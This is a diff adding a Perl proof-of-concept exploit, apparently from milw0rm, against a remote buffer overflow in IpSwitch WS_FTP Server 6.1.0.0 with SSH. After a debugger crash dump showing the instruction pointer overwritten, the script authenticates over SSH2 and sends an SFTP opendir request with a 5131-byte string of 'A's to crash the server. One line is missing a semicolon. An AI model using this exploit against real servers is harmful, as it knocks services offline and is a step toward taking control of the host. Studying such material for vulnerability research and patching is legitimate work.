@@ -1,0 +1,39 @@
+# IpSwitch WS_FTPSERVER with SSH remote Buffer Overflow
+#
+# Website:http://www.wsftp.com/products/ws_ftp_server/
+#
+# Version:6.1.0.0 ( last one,others might be vuln too )
+#
+# Bug: Remote Buffer Overflow ( CD)
+#
+# (8e8.a78): Access violation - code c0000005 (first chance)
+# First chance exceptions are reported before any exception handling.
+# This exception may be expected and handled.
+# eax=00000000 ebx=00000000 ecx=00410041 edx=7c9137d8 esi=00000000 edi=00000000
+# eip=00410041 esp=04b8c830 ebp=04b8c850 iopl=0         nv up ei pl zr na po nc
+# cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
+# 00410041 ??               ???
+#
+#
+#Here's the PoC :
+
+
+
+use strict;
+use Net::SSH2;
+my $ip="127.0.0.1";
+my $port=22;
+my $user="USERNAME";
+my $pass="PASSWORD";
+my $ssh2 = Net::SSH2->new();
+my $payload ="A" x 5131;
+$ssh2->connect($ip, $port) || die "could not connect";
+$ssh2->auth_password($user,$pass)|| die "wrong passwd/login";
+print "Poc running ...\n";
+my $sftp = $ssh2->sftp
+my $dir = $sftp->opendir($payload); 
+print "Buffer Overflow Successfull\n";
+$ssh2->disconnect();
+exit;
+
+# milw0rm.com [2008-02-03]
